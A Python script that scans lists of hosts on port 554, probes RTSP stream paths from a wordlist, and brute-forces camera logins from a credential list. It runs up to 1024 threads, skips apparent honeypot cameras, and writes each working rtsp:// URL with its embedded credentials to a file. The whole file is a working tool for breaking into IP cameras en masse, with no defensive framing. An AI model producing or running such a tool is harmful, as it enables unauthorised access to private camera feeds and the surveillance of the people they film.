#!/usr/bin/env python
from concurrent.futures import ThreadPoolExecutor as TPE
from functools import partial
import re
import socket as so
from time import sleep

from fire import Fire

from lib.utils import tim


status_re = re.compile(r'RTSP/\d\.\d (\d\d\d)')


def wrire_result(res):
    with open('./local/rtsp.txt', 'a') as f:
        f.write(f'[{tim()}] {res}\n')


def rtsp_req(host: str, port: int = 554, path: str = '', cred: str = '', timeout: float = 3):
    if cred:
        cred += '@'
    req = (
        f'DESCRIBE rtsp://{cred}{host}:{port}{path} RTSP/1.0\r\n'
        'CSeq: 2\r\n'
        '\r\n'
    )
    tries = 4
    while True:
        try:
            with so.socket() as s:
                s.settimeout(timeout)
                s.connect((host, port))
                s.sendall(req.encode())
                response = s.recv(1024).decode()
                return int(status_re.findall(response)[0])
        except so.timeout:
            break  # slowpoke, 3ff0ff
        except IOError as e:
            # 111 refused
            if e.errno == 111:
                break

            # 104 reset by peer
            if e.errno == 104:
                if tries <= 0:
                    # print('u', end='', flush=True)
                    break  # host f*ckup?
                sleep(2 / tries)
                tries -= 1
                continue

            # too many open files
            if e.errno == 24:
                sleep(0.15)
                continue
            break

        except KeyboardInterrupt:
            raise
        except IndexError:
            break
        except Exception as e:
            print('Unknown error:', e, 'please, contact with dev')
            return 418
    return 503


def check_cred(host, port, path, cred):
    code = rtsp_req(host, port, path, cred)
    if code == 200:
        print('+', end='', flush=True)
        return f'rtsp://{cred}@{host}:{port}{path}'

    if code >= 500:
        print('-', end='', flush=True)
        return

    return ''


def check_path(host, port, path):
    code = rtsp_req(host, port, path)

    if code >= 500:
        print('-', end='', flush=True)
        return

    if code not in [200, 401, 403]:
        # print('.', end='', flush=True)
        return ''

    with open('./data/rtsp_creds.txt') as f:
        creds = [ln.rstrip() for ln in f]

    ch = partial(check_cred, host, port, path)

    with TPE(1) as ex:
        for res in ex.map(ch, creds):
            if res is None:
                return
            if res:
                return res


def check_host(host):
    ch = partial(check_path, host, 554)

    with TPE(2) as ex:
        with open('./data/rtsp_paths.txt') as f:
            paths = [ln.rstrip() for ln in f]

        for rr in ex.map(ch, paths):
            if rr is None:
                return

            if '0h84d' in rr:
                print('~', end='', flush=True)  # fake cam
                return

            if rr:
                wrire_result(rr)
                print('@', end='', flush=True)
                return rr  # first valid path is enough now


def main():
    with open('./local/hosts_554.txt') as f:
        hosts = [ln.rstrip() for ln in f]

    with TPE(1024) as ex:
        results = ex.map(check_host, hosts)
        for i, res in enumerate(list(results)):
            if res:
                print()
                print(f'[+ {i}]', res)


if __name__ == "__main__":
    Fire(main)
